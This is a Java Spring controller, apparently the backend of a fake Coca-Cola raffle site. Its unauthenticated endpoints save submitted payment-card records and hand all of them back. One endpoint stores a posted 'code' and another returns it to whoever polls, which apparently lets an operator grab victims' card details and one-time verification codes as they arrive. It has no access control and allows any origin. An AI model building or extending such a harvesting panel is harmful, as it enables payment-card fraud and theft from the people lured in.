package com.coca_cola.raffle_web_service;

import com.coca_cola.raffle_web_service.maper.IMappers;
import com.cola.coca.cola.panel.PaymentHelper;
import com.cola.coca.cola.panel.PaymentInfo;
import lombok.extern.slf4j.Slf4j;
import org.springframework.boot.autoconfigure.domain.EntityScan;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.web.bind.annotation.*;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

@RestController
@RequestMapping("api")
@EntityScan(basePackages = "com.cola")
@EnableJpaRepositories(basePackages = "com.cola")
@ComponentScan(basePackages = "com.cola.coca.cola.panel")
@Slf4j
public class Controler {
    private String m_Code = "";
    public PaymentHelper repo;


    public Controler(PaymentHelper repo) {
        this.repo = repo;
    }

    @CrossOrigin(origins = "*")
    @PostMapping("/payment")
    public void PostPayment(@RequestBody PaymentInfo payment) {
        try {
            log.info("----------------------------------");
            log.info("name = {} phone ={}", payment.cardName, payment.phone);
            repo.save(payment);


        } catch (Throwable ex) {
            log.error("Throwable Exception PostPayment Post");
        }

    }

    @CrossOrigin(origins = "*")
    @PostMapping("/code")
    public void PostCode(@RequestBody String codes) {
        try {
            log.info("----------------------------------");
            log.info("code = {}", codes);
            m_Code = codes;


        } catch (Throwable ex) {
            log.error("Throwable Exception PostCode Post");
        }

    }

    @CrossOrigin(origins = "*")
    @GetMapping("/getCode")
    public String getM_Code() {

        try {
            log.info("----------------------------------");

            log.info("getCode {}",m_Code );

            return m_Code.isEmpty() ? "Boş" : m_Code;
        } catch (Throwable ex) {
            log.error("Throwable Exception getM_Code Get");
        }
        return null;
    }
    @CrossOrigin(origins = "*")
    @GetMapping("/findall")
    public List<PaymentInfo> findByAll() {

        try {
            log.info("----------------------------------");
            var x = new ArrayList<>(repo.findAll().stream().toList());
            Collections.reverse(x);
            log.info("findByAll {}",x.toString() );

            return x;
        } catch (Throwable ex) {
            log.error("Throwable Exception findByAll Get");
        }
        return null;
    }

}
